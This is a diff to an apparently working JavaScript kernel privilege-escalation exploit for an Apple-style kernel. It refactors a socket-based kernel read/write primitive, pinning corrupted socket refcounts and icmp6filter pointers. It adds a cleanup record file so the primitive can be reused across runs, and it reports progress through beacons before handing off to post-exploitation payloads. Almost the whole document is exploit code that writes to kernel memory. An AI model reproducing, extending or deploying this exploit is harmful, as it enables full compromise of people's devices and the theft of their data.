@@ -855,6 +855,8 @@
   let rw_socket = 0n;
   let control_socket_pcb = 0n;
   let rw_socket_pcb = 0n;
+  let rw_socket_original_icmp6filter = 0n;
+  let rw_socket_original_icmp6filter_next = 0n;
   let EARLY_KRW_LENGTH = 0x20n;
   let control_data = calloc(1n, EARLY_KRW_LENGTH);
   function set_target_kaddr(where) {
@@ -965,21 +967,153 @@
       LOG(`[+] [${i.hex()}] ${(where + i).hex()}:\t${early_kread64(where + i).hex()} ${early_kread64(where + i + 8n).hex()}`);
     }
   }
-  function krw_sockets_leak_forever() {
-    let offset_pcb_socket = 0x40n;
-    let offset_socket_so_count = 0x254n;
-    let control_socket_addr = early_kread64(control_socket_pcb + offset_pcb_socket);
-    let rw_socket_addr = early_kread64(rw_socket_pcb + offset_pcb_socket);
+  const KRW_CLEANUP_RECORD_PATH = "/private/var/tmp/lightsaber_krw_cleanup.bin";
+  const KRW_CLEANUP_MAGIC = 0x4c534b5257434c4en; // "LSKRWCLN"
+  const KRW_CLEANUP_VERSION = 1n;
+  const KRW_LEAK_DELTA = 0x0000100100001001n;
+  const KRW_RECORD_QWORDS = 10n;
+  const KRW_RECORD_SIZE = KRW_RECORD_QWORDS * 8n;
+  const OFFSET_PCB_SOCKET = 0x40n;
+  const OFFSET_SOCKET_SO_COUNT = 0x254n;
+  const ICMP6FILT_OFFSET = 0x148n;
+  function is_kernel_pointer(ptr) {
+    return ptr >= 0xffffff8000000000n && ptr <= 0xffffffffffffffffn;
+  }
+  function cleanup_record_path() {
+    return get_cstring(KRW_CLEANUP_RECORD_PATH);
+  }
+  function cleanup_record_remove() {
+    try { remove(cleanup_record_path()); } catch (_) {}
+  }
+  function read_cleanup_record() {
+    let fd = open(cleanup_record_path(), 0n);
+    if (fd == 0xFFFFFFFFFFFFFFFFn || fd < 0n) {
+      return null;
+    }
+    let buf = calloc(1n, KRW_RECORD_SIZE);
+    try {
+      let got = read(fd, buf, KRW_RECORD_SIZE);
+      if (got != KRW_RECORD_SIZE) {
+        return null;
+      }
+      if (uread64(buf) != KRW_CLEANUP_MAGIC || uread64(buf + 0x8n) != KRW_CLEANUP_VERSION) {
+        return null;
+      }
+      return {
+        rw_socket_pcb: uread64(buf + 0x10n),
+        control_socket_addr: uread64(buf + 0x18n),
+        rw_socket_addr: uread64(buf + 0x20n),
+        control_socket_so_count: uread64(buf + 0x28n),
+        rw_socket_so_count: uread64(buf + 0x30n),
+        rw_filter: uread64(buf + 0x38n),
+        rw_filter_next: uread64(buf + 0x40n),
+        leak_delta: uread64(buf + 0x48n)
+      };
+    } finally {
+      close(fd);
+      free(buf);
+    }
+  }
+  function write_cleanup_record(record) {
+    let fd = fcall(OPEN, cleanup_record_path(), 0x0601n, 0o600n);
+    if (fd == 0xFFFFFFFFFFFFFFFFn || fd < 0n) {
+      LOG("[KRW-CLEAN] failed to open cleanup record for write");
+      return false;
+    }
+    let buf = calloc(1n, KRW_RECORD_SIZE);
+    try {
+      uwrite64(buf, KRW_CLEANUP_MAGIC);
+      uwrite64(buf + 0x8n, KRW_CLEANUP_VERSION);
+      uwrite64(buf + 0x10n, record.rw_socket_pcb);
+      uwrite64(buf + 0x18n, record.control_socket_addr);
+      uwrite64(buf + 0x20n, record.rw_socket_addr);
+      uwrite64(buf + 0x28n, record.control_socket_so_count);
+      uwrite64(buf + 0x30n, record.rw_socket_so_count);
+      uwrite64(buf + 0x38n, record.rw_filter);
+      uwrite64(buf + 0x40n, record.rw_filter_next);
+      uwrite64(buf + 0x48n, KRW_LEAK_DELTA);
+      let wrote = write(fd, buf, KRW_RECORD_SIZE);
+      fsync(fd);
+      if (wrote != KRW_RECORD_SIZE) {
+        LOG("[KRW-CLEAN] short cleanup record write");
+        return false;
+      }
+      LOG("[KRW-CLEAN] saved cleanup record");
+      return true;
+    } finally {
+      close(fd);
+      free(buf);
+    }
+  }
+  function cleanup_previous_krw_record() {
+    let record = read_cleanup_record();
+    if (record == null) {
+      LOG("[KRW-CLEAN] no previous cleanup record");
+      return false;
+    }
+    if (record.leak_delta != KRW_LEAK_DELTA ||
+        !is_kernel_pointer(record.rw_socket_pcb) ||
+        !is_kernel_pointer(record.control_socket_addr) ||
+        !is_kernel_pointer(record.rw_socket_addr)) {
+      LOG("[KRW-CLEAN] stale cleanup record failed sanity checks");
+      cleanup_record_remove();
+      return false;
+    }
+    let observed_control = early_kread64(record.control_socket_addr + OFFSET_SOCKET_SO_COUNT);
+    let observed_rw = early_kread64(record.rw_socket_addr + OFFSET_SOCKET_SO_COUNT);
+    if (observed_control != record.control_socket_so_count + record.leak_delta ||
+        observed_rw != record.rw_socket_so_count + record.leak_delta) {
+      LOG("[KRW-CLEAN] previous sockets no longer match pinned refcounts; removing record");
+      cleanup_record_remove();
+      return false;
+    }
+    early_kwrite64(record.control_socket_addr + OFFSET_SOCKET_SO_COUNT, record.control_socket_so_count);
+    early_kwrite64(record.rw_socket_addr + OFFSET_SOCKET_SO_COUNT, record.rw_socket_so_count);
+    early_kwrite64(record.rw_socket_pcb + ICMP6FILT_OFFSET, record.rw_filter);
+    early_kwrite64(record.rw_socket_pcb + ICMP6FILT_OFFSET + 0x8n, record.rw_filter_next);
+    cleanup_record_remove();
+    LOG("[KRW-CLEAN] restored previous KRW socket state");
+    return true;
+  }
+  function cleanup_current_krw_sockets() {
+    let control_socket_addr = early_kread64(control_socket_pcb + OFFSET_PCB_SOCKET);
+    let rw_socket_addr = early_kread64(rw_socket_pcb + OFFSET_PCB_SOCKET);
+    if (control_socket_addr == 0n || rw_socket_addr == 0n) {
+      LOG("[KRW-CLEAN] current socket addresses missing");
+      return false;
+    }
+    if (is_kernel_pointer(rw_socket_original_icmp6filter)) {
+      early_kwrite64(rw_socket_pcb + ICMP6FILT_OFFSET, rw_socket_original_icmp6filter);
+      early_kwrite64(rw_socket_pcb + ICMP6FILT_OFFSET + 0x8n, rw_socket_original_icmp6filter_next);
+    }
+    try { close(control_socket); } catch (_) {}
+    try { close(rw_socket); } catch (_) {}
+    LOG("[KRW-CLEAN] closed current cleanup-run KRW fds");
+    return true;
+  }
+  function krw_sockets_pin_for_lifetime() {
+    let control_socket_addr = early_kread64(control_socket_pcb + OFFSET_PCB_SOCKET);
+    let rw_socket_addr = early_kread64(rw_socket_pcb + OFFSET_PCB_SOCKET);
     if (control_socket_addr == 0n || rw_socket_addr == 0n) {
       LOG("[-] Couldn't find control_socket_addr || rw_socket_addr");
       exit(0n);
     }
-    let control_socket_so_count = early_kread64(control_socket_addr + offset_socket_so_count);
-    let rw_socket_so_count = early_kread64(rw_socket_addr + offset_socket_so_count);
-    early_kwrite64(control_socket_addr + offset_socket_so_count, control_socket_so_count + 0x0000100100001001n);
-    early_kwrite64(rw_socket_addr + offset_socket_so_count, rw_socket_so_count + 0x0000100100001001n);
-    let icmp6filt_offset = 0x148n;
-    early_kwrite64(rw_socket_pcb + icmp6filt_offset + 0x8n, 0n);
+    let control_socket_so_count = early_kread64(control_socket_addr + OFFSET_SOCKET_SO_COUNT);
+    let rw_socket_so_count = early_kread64(rw_socket_addr + OFFSET_SOCKET_SO_COUNT);
+    let rw_filter = early_kread64(rw_socket_pcb + ICMP6FILT_OFFSET);
+    let rw_filter_next = early_kread64(rw_socket_pcb + ICMP6FILT_OFFSET + 0x8n);
+    write_cleanup_record({
+      rw_socket_pcb,
+      control_socket_addr,
+      rw_socket_addr,
+      control_socket_so_count,
+      rw_socket_so_count,
+      rw_filter,
+      rw_filter_next
+    });
+    early_kwrite64(control_socket_addr + OFFSET_SOCKET_SO_COUNT, control_socket_so_count + KRW_LEAK_DELTA);
+    early_kwrite64(rw_socket_addr + OFFSET_SOCKET_SO_COUNT, rw_socket_so_count + KRW_LEAK_DELTA);
+    early_kwrite64(rw_socket_pcb + ICMP6FILT_OFFSET + 0x8n, 0n);
   }
   let socket_ports = [];
   let socket_pcb_ids = [];
@@ -1090,9 +1224,12 @@
       }
       let inp_list_next_pointer = uread64(read_buffer + pcb_start_offset + 0x28n) - 0x20n;
       let icmp6filter = uread64(read_buffer + pcb_start_offset + icmp6filt_offset);
+      let icmp6filter_next = uread64(read_buffer + pcb_start_offset + icmp6filt_offset + 0x8n);
       LOG("[+] inp_list_next_pointer: " + inp_list_next_pointer.hex());
       LOG("[+] icmp6filter: " + icmp6filter.hex());
       rw_socket_pcb = BigInt(inp_list_next_pointer);
+      rw_socket_original_icmp6filter = icmp6filter;
+      rw_socket_original_icmp6filter_next = icmp6filter_next;
       memcpy(write_buffer, read_buffer, oob_size);
       uwrite64(write_buffer + pcb_start_offset + icmp6filt_offset, inp_list_next_pointer + icmp6filt_offset);
       uwrite64(write_buffer + pcb_start_offset + icmp6filt_offset + 0x8n, 0n);
@@ -1418,7 +1555,13 @@
       kernel_base -= PAGE_SIZE;
     }
     kernel_slide = kernel_base - 0xfffffff007004000n;
-    krw_sockets_leak_forever();
+    cleanup_previous_krw_record();
+    if (globalThis.__ls_run_mode === "cleanup") {
+      cleanup_current_krw_sockets();
+      return true;
+    }
+    krw_sockets_pin_for_lifetime();
+    return true;
   }
   mpd_js_thread_spawn = js_thread_spawn;
   mpd_js_thread_join = js_thread_join;
@@ -1472,6 +1615,11 @@
     throw e;
   }
   sendBeacon("pe_done");
+  if (globalThis.__ls_run_mode === "cleanup") {
+    LOG("[PE] cleanup-only mode complete; skipping post-exploitation payloads");
+    try { peAck(0x1c1ean); } catch (_) {}
+    return;
+  }
    
   LOG("[+] PE Post-Exploitation !!!");
   LOG(`[+] kernel_base: ${mpd_kernel_base().hex()}`);
